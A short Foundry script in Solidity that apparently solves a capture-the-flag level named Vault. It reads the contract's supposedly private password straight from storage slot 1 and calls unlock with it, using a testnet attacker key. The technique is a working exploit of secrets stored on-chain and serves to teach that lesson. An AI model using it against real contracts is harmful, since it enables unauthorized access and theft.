// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {Vault} from "src/levels/Vault.sol";

contract VaultScript is Script {
    bytes32 private constant SLOT = bytes32(uint256(1));

    function run() external {
        address vaultAddress = vm.envAddress("VAULT_ADDRESS");
        Vault vault = Vault(vaultAddress);
        uint attackerKey = vm.envUint("TESTNET_PRIVATE_KEY_1");

        vm.startBroadcast(attackerKey);

        // Password is stored at slot number 1. Get value st storage slot number 1
        bytes32 password = vm.load(vaultAddress, SLOT);

        // Unlock the vault using password
        vault.unlock(password);

        vm.stopBroadcast();
        console.log("SUCCESS!!! Submit the instance.");
    }
}
